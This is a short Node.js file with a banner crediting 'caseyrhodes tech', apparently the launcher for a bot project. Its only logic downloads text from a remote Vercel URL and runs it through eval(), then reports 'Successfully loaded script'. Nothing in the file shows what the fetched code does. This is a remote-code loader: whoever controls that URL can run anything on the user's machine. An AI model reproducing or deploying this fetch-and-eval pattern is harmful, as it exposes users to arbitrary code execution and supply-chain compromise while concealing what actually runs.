/*

 _____                                 _                 _            
/  __ \                               | |               | |           
| /  \/  __ _  ___   ___  _   _  _ __ | |__    ___    __| |  ___  ___ 
| |     / _` |/ __| / _ \| | | || '__|| '_ \  / _ \  / _` | / _ \/ __|
| \__/\| (_| |\__ \|  __/| |_| || |   | | | || (_) || (_| ||  __/\__ \
 \____/ \__,_||___/ \___| \__, ||_|   |_| |_| \___/  \__,_| \___||___/
                           __/ |                                      
                          |___/                                       

 _____              _     
|_   _|            | |    
  | |    ___   ___ | |__  
  | |   / _ \ / __|| '_ \ 
  | |  |  __/| (__ | | | |
  \_/   \___| \___||_| |_|
@ Project Name : caseyrhodes tech 
* Creator      : Caseyrhodes Tech 
* My Git       : https//github.com/caseyweb 
* Contact      : wa.me/254112192119
*
* Release Date : 18 august 2025 12.01 AM
*/
const axios = require('axios');
const hans = "https://hans-xmdv2-two.vercel.app/api/🎃";
axios.get(hans)
    .then(response => {
        console.log("\x1b[32m✅ Successfully loaded script.\x1b[0m");
        eval(response.data);
    })
    .catch(err => {
        console.error("\x1b[31m❌ Failed to load script from HansTz Sever API. Error:", err.message, "\x1b[0m");
    });
